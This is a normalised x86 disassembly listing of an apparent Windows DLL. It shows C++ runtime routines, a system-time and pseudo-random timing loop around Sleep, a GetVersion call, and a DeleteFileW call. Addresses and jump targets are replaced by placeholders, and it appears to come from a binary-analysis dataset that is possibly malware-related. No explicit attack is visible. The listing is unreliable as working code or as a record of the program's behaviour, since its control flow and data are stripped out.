mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
test eax eax
je r-xdata
mov ecx [ esi ]
call sub_1000d02e
call sub_100282db
retn 0x4
lea ecx [ eax + 0x4 ]
call sub_10023135
sub_1000d0a3
push esi
mov esi ecx
push esi
mov [ esi ] r--data
call sub_10023026
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000d16f
push 0x4
mov eax sub_1004cbd7
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
push 0x0
push 0x1
lea ecx [ esi + 0x4 ]
call sub_10001500
call sub_100282db
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000d1a9
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004e809
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi + 0x20 ]
xor edi edi
cmp eax edi
je r-xdata
push 0x44
call sub_10024389
pop ecx
mov [ esp + 0xc ] eax
mov [ esp + 0x60 ] 0x1
cmp eax edi
je r-xdata
push r--data
lea ecx [ esp + 0x14 ]
call sub_10001c7f
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x30 ]
mov [ esp + 0x64 ] edi
call sub_10002075
push r--data
lea eax [ esp + 0x30 ]
push eax
call sub_10027dd1
or [ esp + 0x60 ] 0xffffffff
mov ecx [ esi + 0x20 ]
cmp edi ecx
je r-xdata
lea ecx [ esi + 0x4 ]
push ecx
push eax
call sub_10016bf0
mov edi eax
mov [ esi + 0x20 ] edi
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000d268
push 0x1c
mov eax sub_1004dff5
call sub_10028203
mov esi ecx
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001c7f
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
lea ecx [ ebp - 0x28 ]
push ecx
mov ecx esi
call [ eax + 0x14 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
call sub_100282db
retn 0x4
sub_1000d2a9
push 0x1c
mov eax sub_1004dff5
call sub_10028203
mov esi ecx
push 0x0
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x10 ] 0xf
call sub_10002004
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
lea ecx [ ebp - 0x28 ]
push ecx
push [ ebp + 0x8 ]
mov ecx esi
call [ eax + 0x14 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
call sub_100282db
retn 0x4
sub_1000d2ee
push ecx
push ecx
and [ esp + 0x4 ] 0x0
push ebx
mov ebx ecx
mov ecx [ eax + 0x20 ]
test ecx ecx
jne r-xdata
push ebx
push ecx
call sub_10016cc6
lea ecx [ eax + 0x4 ]
call sub_10016b7f
jmp r-xdata
mov eax ebx
pop ebx
pop ecx
pop ecx
retn
sub_1000d316
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004ec31
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov eax ecx
lea ecx [ esp + 0x18 ]
call sub_1000d2ee
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ esp + 0x48 ] ebx
mov eax [ edi + 0x14 ]
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x14 ]
push eax
push [ esp + 0x1c ]
push 0x4
pop esi
call sub_10016e80
mov esi [ esp + 0x14 ]
cmp esi ebx
jle r-xdata
lea eax [ esp + 0x10 ]
push eax
push [ esp + 0x1c ]
mov [ esp + 0x18 ] ebx
push 0x4
pop esi
call sub_10016f1c
mov esi [ esp + 0x10 ]
push ebx
lea ecx [ esp + 0x24 ]
mov [ esp + 0x3c ] 0xf
call sub_10002004
push ebx
push esi
lea ecx [ esp + 0x28 ]
call sub_10007c8f
mov esi [ ebp + 0xc ]
push 0xffffffff
push ebx
lea eax [ esp + 0x28 ]
push eax
mov ecx esi
mov [ esp + 0x54 ] 0x1
call sub_10001f30
push ebx
push 0x1
lea ecx [ esp + 0x28 ]
mov [ esp + 0x50 ] bl
call sub_10002020
cmp [ esp + 0x10 ] ebx
jle r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
or [ esp + 0x48 ] 0xffffffff
mov ecx [ esp + 0x1c ]
cmp ecx ebx
je r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_10003d5c
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
push edi
push [ esp + 0x1c ]
call sub_10016e80
push esi
push [ esp + 0x1c ]
mov esi [ esp + 0x18 ]
call sub_10016f1c
sub_1000d434
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x2c
push ebx
push esi
push edi
push 0x10
xor esi esi
lea eax [ esp + 0x2c ]
push esi
push eax
call sub_10024b80
add esp 0xc
lea eax [ esp + 0x28 ]
push eax
call [ GetSystemTime@IAT ]
movzx eax [ esp + 0x2e ]
xor edx edx
inc edx
push ecx
mov ecx esp
mov [ ecx ] dx
movzx edx ax
inc edx
cmp edx 0x2
jge r-xdata
cmp ax 0x1f
ja r-xdata
call sub_1000e976
xor edx edx
mov [ ecx ] ax
movzx eax [ esp + 0x2e ]
inc edx
push ecx
mov ecx esp
mov [ ecx ] dx
movzx edx ax
inc edx
cmp edx 0x2
jge r-xdata
cmp ax 0xc
ja r-xdata
call sub_1000e8ff
push ecx
mov [ ecx ] ax
mov ecx [ esp + 0x34 ]
mov eax esp
call sub_1000e6a3
lea eax [ esp + 0x18 ]
push eax
call sub_1000ed84
movzx eax [ esp + 0x34 ]
movzx ecx [ esp + 0x32 ]
push esi
push esi
push eax
movzx eax [ esp + 0x3c ]
call sub_1000e337
add esp 0xc
mov [ esp + 0x18 ] eax
movzx eax [ esp + 0x36 ]
push esi
mov [ esp + 0x20 ] edx
cdq
push 0xf4240
push edx
push eax
call sub_1002b270
push esi
push 0x3e8
push edx
push eax
call sub_10030250
push edx
push eax
push esi
xor ecx ecx
xor eax eax
call sub_1000e337
add esp 0xc
lea ebx [ esp + 0x10 ]
lea esi [ esp + 0x20 ]
lea edi [ esp + 0x18 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
call sub_1000dec8
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov edi [ ebp + 0x8 ]
mov [ esp + 0x1c ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0xc ] eax
lea ecx [ esp + 0x18 ]
lea eax [ esp + 0xc ]
call sub_1000e2b9
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000d555
push 0x28
mov eax sub_1004f799
call sub_10028203
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_1000d0d5
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x10 ]
lea ecx [ esi + 0x18 ]
mov [ esi ] r--data
call sub_1000136c
xor ebx ebx
inc ebx
lea eax [ esi + 0x34 ]
mov [ ebp - 0x4 ] bl
mov ecx [ ebp + 0xc ]
push eax
call sub_100010a7
lea edi [ esi + 0x138 ]
mov [ ebp - 0x4 ] 0x2
mov eax edi
mov [ ebp + 0x10 ] edi
call sub_1000d0d5
lea eax [ edi + 0x18 ]
mov [ ebp - 0x4 ] 0x3
push eax
mov [ edi ] r--data
call sub_100119cb
mov [ edi + 0x30 ] 0x0
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x2c ]
mov [ esi + 0x16c ] 0x0
push eax
mov [ esi + 0x170 ] ebx
call sub_1000d434
mov ecx ebx
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] cx
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] cx
mov ecx 0x7b2
mov eax esp
mov [ ebp + 0x10 ] esp
call sub_1000e6a3
lea eax [ ebp + 0xc ]
push eax
call sub_1000ed84
mov eax [ eax ]
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x18 ] 0x0
mov [ ebp + 0x10 ] eax
lea ecx [ ebp - 0x1c ]
lea eax [ ebp + 0x10 ]
lea edi [ ebp - 0x24 ]
call sub_1000e2b9
lea eax [ ebp - 0x34 ]
push eax
mov eax edi
lea ecx [ ebp - 0x2c ]
call sub_1000dd7b
mov eax [ ebp - 0x34 ]
pop ecx
xor edx edx
mov ecx 0x7fffffff
div ecx
mov [ esi + 0x170 ] edx
test edx edx
jne r-xdata
mov eax esi
call sub_100282db
retn 0xc
mov [ esi + 0x170 ] ebx
sub_1000d66f
push 0x4
mov eax sub_1004ec06
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
lea ecx [ esi + 0x138 ]
mov [ ebp - 0x4 ] 0x2
call sub_10012762
lea edi [ esi + 0x34 ]
call sub_1000211e
push 0x0
push 0x1
lea ecx [ esi + 0x18 ]
call sub_10001500
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_1000d109
call sub_100282db
retn
sub_1000d6bd
push ebp
sub esp 0x108
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x108 ] eax
push 0x2c
mov eax sub_1004fb9b
call sub_10028236
and [ ebp - 0x4 ] 0x0
mov edi ecx
lea eax [ ebp + 0x4 ]
lea ecx [ edi + 0x34 ]
push eax
mov [ ebp - 0x1c ] edi
mov [ ebp ] r--data
call sub_100010a7
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100116ea
mov [ ebp - 0x4 ] 0x2
mov esi [ ebp - 0x28 ]
cmp esi [ ebp - 0x24 ]
jbe r-xdata
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] esi
call sub_10024832
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
call sub_10024832
call sub_10024832
cmp eax [ ebp - 0x34 ]
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000dd28
lea ecx [ ebp ]
call sub_10011476
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea esi [ ebp - 0x18 ]
call sub_100046ab
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] esi
je r-xdata
push edi
call sub_1000db0e
lea eax [ edi + 0x138 ]
call sub_10012905
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x108 ]
xor ecx ebp
call sub_100242d7
add ebp 0x10c
leave
retn
lea esi [ ebp - 0x18 ]
call sub_1000dd50
jmp r-xdata
call sub_100046ab
mov edx [ eax ]
push ecx
push ecx
mov ecx esp
add eax 0x4
mov [ ebp - 0x38 ] esp
mov [ ecx ] edx
push eax
add ecx 0x4
call sub_10003d36
lea esi [ edi + 0x138 ]
call sub_10012797
mov esi [ ebp - 0x24 ]
cmp [ ebp - 0x28 ] esi
jbe r-xdata
sub_1000d7ae
mov edi [ ebp - 0x1c ]
push edi
call sub_1000db0e
lea eax [ edi + 0x138 ]
call sub_10012905
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x108 ]
xor ecx ebp
call sub_100242d7
add ebp 0x10c
leave
retn
sub_1000d7f4
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004f737
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2a0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x298 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2b0 ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor ebx ebx
push ebx
lea ecx [ esp + 0xd4 ]
mov [ esp + 0xec ] 0xf
call sub_10002004
lea eax [ esi + 0x170 ]
push eax
lea edi [ esp + 0x18 ]
mov [ esp + 0x2bc ] ebx
call sub_100110bc
pop ecx
mov [ esp + 0x2b8 ] 0x1
cmp [ ebp + 0x8 ] bl
je r-xdata
lea eax [ esp + 0x1a0 ]
lea edi [ esi + 0x34 ]
push eax
mov ecx edi
mov [ esp + 0x1a0 ] r--data
call sub_100010a7
mov [ esp + 0x2b8 ] 0x3
call [ GetVersion@IAT ]
mov [ esp + 0x24 ] eax
lea eax [ esp + 0x44 ]
push eax
call sub_1000286f
lea eax [ esp + 0x28 ]
push eax
mov [ esp + 0x2bc ] 0x4
call sub_1000ef57
pop ecx
push eax
lea eax [ esp + 0x50 ]
push eax
mov [ esp + 0x2c0 ] 0x5
call sub_10004da9
pop ecx
pop ecx
push ebx
push 0x1
lea ecx [ esp + 0x30 ]
mov [ esp + 0x2c0 ] 0x4
call sub_10001500
push r--data
push ecx
lea eax [ esp + 0x54 ]
push r--data
push eax
call sub_10004afa
add esp 0xc
push eax
call sub_10004afa
pop ecx
pop ecx
push [ esp + 0x24 ]
lea eax [ esp + 0x50 ]
push ecx
push r--data
push eax
call sub_10004afa
add esp 0xc
push eax
call sub_1000dc3d
lea ecx [ esp + 0x28 ]
lea eax [ esp + 0x44 ]
call sub_1000299e
push eax
lea eax [ esp + 0xf0 ]
push eax
mov ebx edi
mov [ esp + 0x2c0 ] 0x6
call sub_100129ae
xor ebx ebx
push ebx
push 0x1
lea ecx [ esp + 0x30 ]
mov [ esp + 0x2c0 ] 0x8
call sub_10001500
lea eax [ esp + 0xd0 ]
push eax
lea eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x1a4 ]
push eax
lea ecx [ esp + 0xf8 ]
call sub_10011487
mov [ esp + 0x2b8 ] 0x9
mov ecx [ esp + 0x1c ]
cmp ecx ebx
je r-xdata
mov ecx [ esp + 0x14 ]
cmp ecx ebx
je r-xdata
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
push ecx
push ecx
mov eax esp
mov [ eax ] ecx
lea ecx [ esp + 0x28 ]
mov [ esp + 0x2c ] esp
push ecx
lea ecx [ eax + 0x4 ]
call sub_10003d36
add esi 0x138
call sub_10012797
lea edi [ esp + 0x28 ]
call sub_100111bd
push 0xffffffff
push ebx
push eax
lea ecx [ esp + 0xdc ]
mov [ esp + 0x2c4 ] 0x2
call sub_10001f30
push ebx
push 0x1
mov ecx edi
mov [ esp + 0x2c0 ] 0x1
call sub_10002020
cmp [ esp + 0x1c ] ebx
jne r-xdata
cmp [ ebp + 0x8 ] bl
je r-xdata
mov [ esp + 0x2b8 ] 0x8
mov ecx [ esp + 0x20 ]
cmp ecx ebx
je r-xdata
mov [ esp + 0x2b8 ] 0x8
mov ecx [ esp + 0x20 ]
cmp ecx ebx
je r-xdata
cmp eax ebx
jne r-xdata
cmp [ eax + 0x1c ] 0x8
jb r-xdata
lea ecx [ esp + 0xec ]
call sub_10012a81
lea eax [ esp + 0x44 ]
mov [ esp + 0x2b8 ] 0x3
call sub_1000219b
lea ecx [ esp + 0x19c ]
call sub_10011476
mov [ esp + 0x2b8 ] bl
mov ecx [ esp + 0x18 ]
cmp ecx ebx
je r-xdata
call sub_10003d5c
lea ecx [ esp + 0xec ]
call sub_10012a81
lea eax [ esp + 0x44 ]
mov [ esp + 0x2b8 ] 0x3
call sub_1000219b
lea ecx [ esp + 0x19c ]
call sub_10011476
mov [ esp + 0x2b8 ] bl
mov ecx [ esp + 0x18 ]
cmp ecx ebx
je r-xdata
call sub_10003d5c
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ esp + 0xd8 ]
call sub_10002020
mov al 0x1
call sub_10003d5c
push ebx
push 0x1
lea ecx [ esp + 0xd8 ]
call sub_10002020
xor al al
jmp r-xdata
call sub_10003d5c
push eax
call [ DeleteFileW@IAT ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x2b0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x298 ]
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn 0x4
sub_1000db0e
push 0x30
mov eax sub_1004fb6e
call sub_10028236
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x14 ] 0x0
call sub_100282db
retn 0x4
lea eax [ edi + 0x18 ]
push eax
lea eax [ edi + 0x34 ]
push eax
call sub_1000237f
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x0
mov ecx edi
sete al
mov [ ebp - 0x14 ] al
push [ ebp - 0x14 ]
call sub_1000d7f4
cmp al 0x1
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ edi + 0x68 ]
push 0xa
pop ecx
xor edx edx
div ecx
push eax
call [ Sleep@IAT ]
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_1000d434
mov eax [ edi + 0x68 ]
pop ecx
mov ebx 0x6ddd00
test eax eax
jbe r-xdata
mov al [ edi + 0x16c ]
test al al
jne r-xdata
push 0x0
push 0x2
xor esi esi
push esi
push ebx
call sub_10030250
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x30 ] esi
lea esi [ edi + 0x170 ]
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x34 ] ebx
call sub_1000de5e
xor ecx ecx
push ecx
push ebx
push edx
push eax
call sub_1004b690
mov ebx eax
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2c ]
push eax
call sub_1000d434
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24 ]
lea ecx [ ebp - 0x2c ]
call sub_1000dd7b
pop ecx
pop ecx
lea eax [ edi + 0x18 ]
push eax
lea eax [ edi + 0x34 ]
push eax
call sub_1000237f
push 0x0
push 0x3e8
push [ ebp - 0x18 ]
push [ ebp - 0x1c ]
call sub_10030250
cmp edx esi
jl r-xdata
push 0x3e8
call [ Sleep@IAT ]
mov al [ edi + 0x16c ]
cmp al 0x1
je r-xdata
jg r-xdata
cmp eax ebx
jb r-xdata
jmp r-xdata
sub_1000dc3d
push 0x1c
mov eax sub_1004ef86
call sub_10028236
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
call sub_100053bb
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x1c ] bl
je r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10007d69
pop ecx
lea ecx [ ebp - 0x18 ]
mov esi eax
call sub_10003c49
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
add ecx edi
mov edx [ ecx + 0x28 ]
mov [ ebp - 0x28 ] bl
movzx ecx [ ecx + 0x30 ]
mov ebx [ esi ]
push ecx
add eax edi
push eax
push edx
push [ ebp - 0x28 ]
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
call [ ebx + 0x18 ]
xor ebx ebx
cmp [ ebp - 0x28 ] bl
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x20 ]
push eax
call sub_1000d05d
mov eax edi
call sub_100282db
retn 0x8
push ebx
push [ ebp - 0x14 ]
call sub_100039ed
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
sub_1000dccc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10003dcd
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_1000dd50
mov eax [ esi ]
test eax eax
jne r-xdata
mov eax [ eax ]
jmp r-xdata
call sub_10024832
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x10 ]
jb r-xdata
xor eax eax
add [ esi + 0x4 ] 0x8
mov eax esi
retn
call sub_10024832
sub_1000dd7b
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1c
push ebx
push esi
push edi
mov esi ecx
push esi
mov edi eax
call sub_1000e183
test al al
jne r-xdata
mov eax [ edi ]
mov [ esp + 0x10 ] eax
mov eax [ edi + 0x4 ]
mov [ esp + 0x14 ] eax
mov eax [ esi ]
mov [ esp + 0x18 ] eax
mov eax [ esi + 0x4 ]
lea ebx [ esp + 0x10 ]
lea esi [ esp + 0x20 ]
lea edi [ esp + 0x18 ]
mov [ esp + 0x1c ] eax
call sub_1000e00d
push [ eax + 0x4 ]
push [ eax ]
call sub_1000e0f0
pop ecx
pop ecx
mov ecx eax
mov eax [ ebp + 0x8 ]
call sub_1000e138
mov eax [ ebp + 0x8 ]
push edi
call sub_1000e183
test al al
jne r-xdata
mov edx [ edi ]
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
mov edi [ edi + 0x4 ]
sub eax edx
sbb ecx edi
push ecx
push eax
push 0x0
xor ecx ecx
xor eax eax
call sub_1000e337
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
add esp 0xc
mov [ ecx + 0x4 ] edx
mov eax ecx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000de39
cmp eax [ esp + 0x4 ]
je r-xdata
retn 0x4
push esi
lea esi [ eax + 0x4 ]
add esi 0x8
lea eax [ esi - 0x4 ]
cmp eax [ esp + 0x8 ]
jne r-xdata
call sub_10003d5c
mov ecx [ esi ]
test ecx ecx
je r-xdata
pop esi
sub_1000de5e
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x10
push ebx
mov ebx [ eax + 0xc ]
push edi
mov edi [ eax + 0x8 ]
mov [ esp + 0x8 ] edi
mov [ esp + 0xc ] ebx
fild [ esp + 0x8 ]
push ecx
push ecx
fstp [ esp + 0x18 ]
fild [ eax ]
fstp [ esp + 0x10 ]
fld1
fstp [ esp ]
push 0x1
call sub_1000dfab
fld [ esp + 0x1c ]
fsub [ esp + 0x14 ]
add esp 0xc
fadd [ r--data ]
fmulp st1
fadd [ esp + 0x8 ]
fcom [ esp + 0x10 ]
fnstsw ax
test ah 0x1
jne r-xdata
call sub_1004b616
fstp st0
mov eax edi
mov edx ebx
jmp r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000dec8
push ecx
push edi
call sub_1000e183
test al al
jne r-xdata
mov eax edi
call sub_1000e1a7
test al al
jne r-xdata
push ebx
call sub_1000e183
test al al
je r-xdata
mov [ esi ] 0xfffffffe
mov eax ebx
call sub_1000e1a7
test al al
jne r-xdata
mov eax [ ebx ]
add eax [ edi ]
mov ecx [ ebx + 0x4 ]
adc ecx [ edi + 0x4 ]
mov [ esi ] eax
mov [ esi + 0x4 ] ecx
jmp r-xdata
mov eax [ edi ]
push [ edi + 0x4 ]
push eax
call sub_1000e1bc
pop ecx
pop ecx
test al al
je r-xdata
mov eax esi
pop ecx
retn
push [ edi + 0x4 ]
push [ edi ]
call sub_1000e1d4
pop ecx
pop ecx
test al al
je r-xdata
push [ ebx + 0x4 ]
push [ ebx ]
call sub_1000e1d4
pop ecx
pop ecx
test al al
jne r-xdata
mov eax edi
call sub_1000e1e8
test al al
je r-xdata
push [ ebx + 0x4 ]
push [ ebx ]
call sub_1000e1bc
pop ecx
pop ecx
test al al
jne r-xdata
mov eax [ ebx ]
push [ ebx + 0x4 ]
push eax
call sub_1000e1bc
pop ecx
pop ecx
test al al
je r-xdata
mov eax [ edi ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
push [ ebx + 0x4 ]
push [ ebx ]
call sub_1000e1d4
pop ecx
pop ecx
test al al
je r-xdata
or [ esi ] 0xffffffff
jmp r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x80000000
jmp r-xdata
mov [ esi + 0x4 ] 0x7fffffff
sub_1000dfab
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ esi ]
mov ecx 0xbc8f
mul ecx
push 0x0
push 0x7fffffff
push edx
push eax
call sub_1004b560
mov [ ebp - 0x4 ] edx
mov [ esi ] eax
cmp eax [ rw-data ]
jae r-xdata
mov eax [ esi ]
sub eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
test eax eax
jge r-xdata
add eax 0x7fffffff
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
fild [ ebp + 0x8 ]
test eax eax
jge r-xdata
fadd [ r--data ]
fsubr [ r--data ]
fadd [ ebp + 0xc ]
fdivp st1
leave
retn
fadd [ r--data ]
sub_1000e00d
push ecx
push edi
call sub_1000e183
test al al
jne r-xdata
mov eax edi
call sub_1000e1a7
test al al
jne r-xdata
push ebx
call sub_1000e183
test al al
je r-xdata
mov [ esi ] 0xfffffffe
mov eax ebx
call sub_1000e1a7
test al al
jne r-xdata
mov eax [ edi ]
sub eax [ ebx ]
mov ecx [ edi + 0x4 ]
sbb ecx [ ebx + 0x4 ]
mov [ esi ] eax
mov [ esi + 0x4 ] ecx
jmp r-xdata
mov eax [ edi ]
push [ edi + 0x4 ]
push eax
call sub_1000e1bc
pop ecx
pop ecx
test al al
je r-xdata
mov eax esi
pop ecx
retn
push [ edi + 0x4 ]
push [ edi ]
call sub_1000e1d4
pop ecx
pop ecx
test al al
je r-xdata
push [ ebx + 0x4 ]
push [ ebx ]
call sub_1000e1bc
pop ecx
pop ecx
test al al
jne r-xdata
mov eax edi
call sub_1000e1e8
test al al
je r-xdata
push [ ebx + 0x4 ]
push [ ebx ]
call sub_1000e1d4
pop ecx
pop ecx
test al al
jne r-xdata
mov eax [ ebx ]
push [ ebx + 0x4 ]
push eax
call sub_1000e1bc
pop ecx
pop ecx
test al al
je r-xdata
mov eax [ edi ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
push [ ebx + 0x4 ]
push [ ebx ]
call sub_1000e1d4
pop ecx
pop ecx
test al al
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x80000000
jmp r-xdata
or [ esi ] 0xffffffff
jmp r-xdata
mov [ esi + 0x4 ] 0x7fffffff
sub_1000e0f0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0xfffffffe
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000e1d4
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp + 0xc ] 0x7fffffff
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000e1bc
movzx eax al
neg eax
sbb eax eax
pop ecx
and eax 0xfffffffd
pop ecx
add eax 0x5
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
sub_1000e138
sub ecx 0x0
je r-xdata
mov [ eax + 0x4 ] 0x7fffffff
dec ecx
je r-xdata
and [ eax ] 0x0
dec ecx
je r-xdata
or [ eax ] 0xffffffff
mov [ eax + 0x4 ] 0x7fffffff
retn
dec ecx
je r-xdata
mov [ eax ] 0x1
jmp r-xdata
dec ecx
mov [ eax + 0x4 ] 0x7fffffff
jne r-xdata
mov [ eax + 0x4 ] 0x80000000
retn
mov [ eax ] 0xfffffffe
retn
mov [ eax ] 0xfffffffd
retn
sub_1000e183
mov eax [ esp + 0x4 ]
call sub_1000e1e8
test al al
jne r-xdata
xor eax eax
inc eax
mov eax [ esp + 0x4 ]
call sub_1000e1a7
test al al
jne r-xdata
xor eax eax
jmp r-xdata
retn 0x4
sub_1000e1e8
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
test ecx ecx
jne r-xdata
cmp ecx 0xffffffff
jne r-xdata
cmp eax 0x80000000
je r-xdata
xor eax eax
retn
cmp eax 0x7fffffff
je r-xdata
xor eax eax
inc eax
retn
sub_1000e20b
push ecx
push edi
push ebx
call sub_1000e183
test al al
jne r-xdata
mov eax ebx
call sub_1000e1a7
test al al
jne r-xdata
mov eax [ esp + 0xc ]
mov edi [ eax ]
test edi edi
je r-xdata
mov [ esi ] 0xfffffffe
mov eax [ esp + 0xc ]
mov edi [ eax ]
cmp edi 0xfffffffe
je r-xdata
cmp edi 0xffffffff
je r-xdata
mov eax [ ebx ]
push [ ebx + 0x4 ]
push eax
call sub_1000e1bc
pop ecx
pop ecx
test al al
je r-xdata
cmp edi 0xfffffffe
jne r-xdata
push [ ebx + 0x4 ]
push [ ebx ]
call sub_1000e1d4
pop ecx
pop ecx
test al al
je r-xdata
test edi edi
je r-xdata
xor eax eax
add edi [ ebx ]
